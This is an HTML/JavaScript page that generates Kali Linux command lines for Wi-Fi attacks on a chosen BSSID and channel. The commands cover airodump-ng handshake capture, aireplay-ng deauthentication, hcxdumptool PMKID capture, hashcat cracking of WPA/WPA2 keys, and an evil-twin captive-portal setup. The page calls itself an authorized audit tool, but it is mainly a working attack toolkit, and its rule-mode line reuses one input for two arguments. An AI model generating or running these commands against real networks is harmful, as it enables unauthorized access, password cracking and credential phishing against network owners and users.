<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Kali Wi-Fi Audit Command Generator</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
html, body {
  max-width: 100%;
  overflow-x: hidden;
  margin: 0;
  font-family: system-ui, -apple-system, Segoe UI, Roboto;
  background: #0f1220;
  color: #e6e8ff;
}

.wrapper {
  max-width: 420px;
  margin: auto;
  padding: 12px;
}

h1 { font-size: 20px; margin: 8px 0; }
h2 { font-size: 15px; margin: 0 0 10px; }
.small { font-size: 12px; color: #9aa0ff; margin-bottom: 8px; }

.card {
  background: #171a2b;
  border: 1px solid #24284a;
  border-radius: 14px;
  padding: 14px;
  margin-bottom: 14px;
}

label.field {
  display: block;
  font-size: 13px;
  color: #9aa0ff;
  margin-top: 6px;
}

input, select {
  width: 100%;
  margin-top: 4px;
  margin-bottom: 10px;
  background: #0b0d1a;
  color: #e6e8ff;
  border: 1px solid #24284a;
  border-radius: 10px;
  padding: 12px;
  font-size: 14px;
}

/* ===== CHECKBOX LABEL FIX ===== */
label.checkbox-label {
  display: block;
  font-size: 14px;
  color: #e6e8ff;
  margin-bottom: 10px;
  cursor: pointer;
}

label.checkbox-label input {
  margin-right: 8px;
}

/* OUTPUT */
pre {
  background: #050610;
  border-radius: 12px;
  padding: 12px;
  font-size: 12px;
  white-space: pre-wrap;
  word-break: break-word;
  overflow-wrap: anywhere;
  max-width: 100%;
  overflow: auto;
}

button {
  width: 100%;
  padding: 15px;
  border: none;
  border-radius: 14px;
  font-size: 16px;
  font-weight: 600;
}

.primary { background: #4f8cff; color: #fff; }
.secondary {
  background: #0b0d1a;
  color: #e6e8ff;
  border: 1px solid #24284a;
  margin-top: 8px;
}

.sticky {
  position: sticky;
  bottom: 0;
  background: linear-gradient(#0000,#0008);
  padding-top: 10px;
  padding-bottom: env(safe-area-inset-bottom);
}

.copy-ok {
  text-align: center;
  font-size: 13px;
  color: #4cff8f;
  margin-top: 6px;
  display: none;
}

details summary {
  cursor: pointer;
  color: #9aa0ff;
  font-size: 13px;
  margin-bottom: 8px;
}
</style>
</head>

<body>
<div class="wrapper">

<h1>ðŸ“¡ Wi-Fi Audit Command Generator</h1>
<div class="small">
Offline Â· Command text only Â· wlan1 = monitor Â· wlan0 = SSH safe
</div>

<!-- TARGET -->
<div class="card">
<h2>Target</h2>
<label class="field">BSSID</label>
<input id="bssid" placeholder="AA:BB:CC:DD:EE:FF">

<label class="field">Channel</label>
<input id="channel" placeholder="6">

<label class="field">Output prefix</label>
<input id="out" value="audit">
</div>

<!-- SCAN / CAPTURE -->
<div class="card">
<h2>Scan / Capture</h2>

<label class="checkbox-label"><input type="checkbox" id="scan" checked> Passive scan (airodump)</label>
<label class="checkbox-label"><input type="checkbox" id="handshake"> Handshake capture</label>
<label class="checkbox-label"><input type="checkbox" id="deauth"> Targeted deauth (optional)</label>
</div>

<!-- PMKID -->
<div class="card">
<h2>PMKID</h2>
<label class="checkbox-label"><input type="checkbox" id="pmkid"> PMKID capture (no client required)</label>
</div>

<!-- CRACK -->
<div class="card">
<h2>Offline Crack</h2>

<label class="field">Mode</label>
<select id="crackmode">
  <option value="">None</option>
  <option value="wordlist">Wordlist</option>
  <option value="mask">Mask (non-wordlist)</option>
  <option value="rule">Rule-based</option>
  <option value="inc">Incremental</option>
</select>

<label class="field">Wordlist / Mask / Rule</label>
<input id="crackopt" placeholder="rockyou.txt / ?l?l?d?d / rules/best64.rule">

<label class="field">Hashcat mode</label>
<select id="hashmode">
  <option value="22000">22000 (WPA/WPA2)</option>
  <option value="16800">16800 (legacy)</option>
</select>
</div>

<!-- ADVANCED -->
<div class="card">
<h2>Advanced</h2>
<details>
<summary>Lab / Evil Twin</summary>

<label class="checkbox-label"><input type="checkbox" id="evil"> Evil Twin + Captive Portal (lab)</label>
<label class="field">SSID (optional)</label>
<input id="ssid" placeholder="Clone or custom">

</details>
</div>

<!-- OUTPUT -->
<div class="card">
<h2>Generated Commands</h2>
<pre id="outbox"></pre>
<div class="small" id="count"></div>
<button class="secondary" onclick="copyCmd()">ðŸ“‹ Copy to clipboard</button>
<div class="copy-ok" id="copied">Copied âœ“</div>
</div>

<div class="sticky">
<button class="primary" onclick="generate()">Generate Commands</button>
</div>

</div>

<script>
function generate(){
  let b=[], n=0;
  let B=bssid.value.trim();
  let C=channel.value.trim();
  let O=out.value.trim()||"audit";

  b.push("# === Authorized Wi-Fi Audit Script ===");
  b.push("# wlan1 assumed monitor, wlan0 untouched");
  b.push("");

  if(scan.checked){
    b.push(`airodump-ng wlan1${C?` -c ${C}`:""}${B?` --bssid ${B}`:""} -w ${O}_scan`);
    b.push("");
    n++;
  }

  if(handshake.checked){
    b.push(`airodump-ng wlan1${C?` -c ${C}`:""} --bssid ${B} -w ${O}_hs`);
    if(deauth.checked){
      b.push(`aireplay-ng --deauth 5 -a ${B} wlan1`);
    }
    b.push("");
    n++;
  }

  if(pmkid.checked){
    b.push(`hcxdumptool -i wlan1 -o ${O}_pmkid.pcapng --enable_status=1`);
    b.push(`hcxpcapngtool -o ${O}.22000 ${O}_pmkid.pcapng`);
    b.push("");
    n++;
  }

  if(crackmode.value){
    let m=hashmode.value;
    let opt=crackopt.value;
    if(crackmode.value==="wordlist")
      b.push(`hashcat -m ${m} ${O}.22000 ${opt}`);
    if(crackmode.value==="mask")
      b.push(`hashcat -m ${m} ${O}.22000 -a 3 ${opt}`);
    if(crackmode.value==="rule")
      b.push(`hashcat -m ${m} ${O}.22000 ${opt} -r ${opt}`);
    if(crackmode.value==="inc")
      b.push(`hashcat -m ${m} ${O}.22000 -a 3 ?l?l?l?l?d?d`);
    b.push("");
    n++;
  }

  if(evil.checked){
    b.push("# Evil Twin / Captive (lab)");
    b.push("hostapd hostapd.conf");
    b.push("dnsmasq -C dnsmasq.conf");
    b.push("");
    n++;
  }

  outbox.textContent=b.join("\n");
  count.textContent=`Generated sections: ${n}`;
}

function copyCmd(){
  let t=outbox.textContent;
  if(!t) return;
  navigator.clipboard.writeText(t).then(()=>{
    copied.style.display="block";
    setTimeout(()=>copied.style.display="none",1500);
  });
}
</script>

</body>
</html>
